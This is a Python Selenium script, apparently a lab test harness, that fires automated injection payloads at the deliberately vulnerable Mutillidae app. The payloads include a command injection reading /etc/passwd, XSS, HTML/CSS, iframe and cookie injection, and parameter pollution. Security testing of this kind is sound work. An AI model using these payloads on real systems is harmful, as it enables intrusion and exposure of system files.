from selenium.common.exceptions import UnexpectedAlertPresentException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.common.by import By
from xss_alert_checker import FirefoxBrowser
from time import sleep
import unittest


def buffer_overflow(ip="192.168.255.133", sleep_time=0):
    browser = FirefoxBrowser().driver
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=repeater.php")
        browser.find_element(By.NAME, "string_to_repeat").send_keys("hello")
        browser.find_element(By.NAME, "times_to_repeat_string").send_keys("200000000")
        browser.find_element(By.NAME, "repeater-php-submit-button").click()
        sleep(sleep_time)
    except NoSuchElementException as e:
        print(e)
        return False

    try:
        browser.find_element(By.NAME, "string_to_repeat").send_keys("hello")
    except NoSuchElementException as e:
        print("Buffer Overflow succeeded")
        return True
    finally:
        browser.quit()
    return False


def html_css_injection(ip="192.168.255.133", sleep_time=0):
    browser = FirefoxBrowser().driver
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=set-background-color.php")
        # browser.find_element(By.ID, "id_background_color").send_keys("<h1>infected</h1>")
        browser.find_element(By.ID, "id_background_color").send_keys(
            '<style type="text/css">body { color: #40f4cd }</style>'
        )
        browser.find_element(By.NAME, "set-background-color-php-submit-button").click()
        sleep(sleep_time)
        element = browser.find_element(By.CLASS_NAME, "form-header")
        color = element.value_of_css_property("color")
        rgb = (
            color.replace("rgba(", "")
            .replace("rgb(", "")
            .replace(")", "")
            .split(",")[:3]
        )
        if rgb == ["64", " 244", " 205"]:
            print("CSS injection succeeded")
            return True
        return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def command_injection(ip="192.168.255.133", sleep_time=0):
    browser = FirefoxBrowser().driver
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=dns-lookup.php")
        browser.find_element(By.ID, "idTargetHostInput").send_keys(
            "127.0.0.1 && cat /etc/passwd"
        )
        browser.find_element(By.NAME, "dns-lookup-php-submit-button").click()
        sleep(sleep_time)
        element = browser.find_element(By.XPATH, "//pre[@class='report-header']")
        if "Address" in element.text and "root:x:" in element.text:
            print("Command injection succeeded")
            return True
        return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def frame_source_injection(ip="192.168.255.133", sleep_time=0):
    browser = FirefoxBrowser().driver
    try:
        browser.get(
            f"http://{ip}/mutillidae/index.php?page=document-viewer.php&PathToDocument="
            + "<iframe src=https://eportal.pwr.edu.pl/>"
        )
        sleep(sleep_time)
        browser.find_element(By.XPATH, "//iframe[contains(@src, 'eportal.pwr.edu.pl')]")
        print("Frame source injection succeeded")
        return True
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def html_injection(ip="192.168.255.133", sleep_time=0):
    browser = FirefoxBrowser().driver
    try:
        browser.get(
            f"http://{ip}/mutillidae/index.php?page=password-generator.php&username="
            + "%3Cimg%20src=%27https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg%27%3E"
        )
        sleep(sleep_time)
        browser.find_element(
            By.XPATH,
            "//img[@src='https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked!.jpg']",
        )
        print("HTML injection succeeded")
        return True
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def html_injection_via_cookie_into_phpsessid(
    ip="192.168.255.133", sleep_time=0, malicious_value="<h1>infected</h1>"
):
    browser = FirefoxBrowser().driver
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=capture-data.php")
        initial_cookies = browser.get_cookies()
        print("Initial cookies:", initial_cookies)
        browser.add_cookie({"name": "PHPSESSID", "value": malicious_value, "path": "/"})
        browser.refresh()
        updated_cookies = browser.get_cookies()
        print("Updated cookies:", updated_cookies)
        sleep(sleep_time)
        browser.find_element(By.XPATH, "//h1[text()='infected']")
        print("HTML injection via cookie injection succeeded")
        return True
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def html_injection_via_dom_injection(ip="192.168.255.133", sleep_time=0):
    browser = FirefoxBrowser().driver
    try:
        browser.get(
            f"http://{ip}/mutillidae/index.php?page=password-generator.php&username=%3C/script%3E%3Ch1%3Einfected%3C/h1%3E%3Cscript%3E"
        )
        sleep(3)
        browser.find_element(By.XPATH, "//h1[text()='infected']")
        print("HTML injection via DOM injection succeeded")
        return True
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def xss_injection_via_dom_injection(ip="192.168.255.133", sleep_time=0):
    browser = FirefoxBrowser().driver
    try:
        browser.get(
            f'http://{ip}/mutillidae/index.php?page=password-generator.php&username=";alert(%27Hacked!%27);a="'
        )
        WebDriverWait(browser, 3).until(
            EC.alert_is_present(),
            "Timed out waiting for PA creation " + "confirmation popup to appear.",
        )
        alert = browser.switch_to.alert
        print(alert.text)
        sleep(sleep_time)
        alert.accept()
        sleep(sleep_time)
        scripts = browser.find_elements(By.TAG_NAME, "script")
        for script in scripts:
            script_content = script.get_attribute("innerHTML")
            if "alert('Hacked!')" in script_content:
                print("Script with the alert message found.")
                print(f"Script content: {script_content}")
                print("XSS injection via DOM injection succeeded")
                return True
        return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def http_parameter_pollution(ip="192.168.255.133", sleep_time=0):
    browser = FirefoxBrowser().driver
    try:
        browser.get(
            f"http://{ip}/mutillidae/index.php?page=user-poll.php&csrf-token=&choice=nmap&initials=test&choice=netcat&user-poll-php-submit-button=Submit+Vote&"
        )
        sleep(sleep_time)
        element = browser.find_element(By.CLASS_NAME, "report-header")
        if "netcat" in element.text:
            print("HTTP parameter pollution succeeded")
            return True
        return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


########################### DONE TO THIS POINT


def test_xss_get(url="http://192.168.255.133/mutillidae/index.php?page=dns-lookup.php"):
    browser = FirefoxBrowser().driver
    try:
        browser.get(url)
        input_box = browser.find_element(By.ID, "idTargetHostInput")
        input_box.send_keys("<script>alert(1);</script>")
        browser.find_element(By.NAME, "dns-lookup-php-submit-button").click()
        WebDriverWait(browser, 3).until(
            EC.alert_is_present(),
            "Timed out waiting for PA creation " + "confirmation popup to appear.",
        )
        alert = browser.switch_to.alert
        print(alert.text)
        alert.accept()
        return True
    except UnexpectedAlertPresentException as e:
        print(e)
        return True
    except TimeoutException:
        return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


if __name__ == "__main__":
    html_injection_via_dom_injection()
    # buffer_overflow()
